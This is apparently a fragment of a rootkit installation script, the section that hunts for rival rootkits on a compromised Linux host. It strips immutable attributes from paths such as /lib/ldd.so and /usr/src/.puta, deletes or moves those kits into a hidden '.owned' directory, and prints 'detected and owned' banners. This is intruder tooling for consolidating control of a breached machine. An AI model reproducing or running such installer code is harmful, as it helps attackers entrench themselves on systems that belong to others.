# CHECKING FOR HOSTILE ROOTKITS/BACKDORS

mkdir $HOMEDIR/.owned

if [ -f /etc/ttyhash ]; then
chattr -AacdisSu /etc/ttyhash
rm -rf /etc/ttyhash
fi

if [ -d /lib/ldd.so ]; then
chattr -isa /lib/ldd.so
chattr -isa /lib/ldd.so/*
mv /lib/ldd.so $HOMEDIR/.owned/tk8
echo "${RED}[${WHI}sh${RED}]# tk8 detected and owned ...!!!! ${RES}"
fi

if [ -d /usr/src/.puta ]; then
chattr -isa /usr/src/.puta
chattr -isa /usr/src/.puta/*
mv /usr/src/.puta $HOMEDIR/.owned/tk7
echo "${RED}[${WHI}sh${RED}]# tk7 detected and owned ...!!!! ${RES}"
fi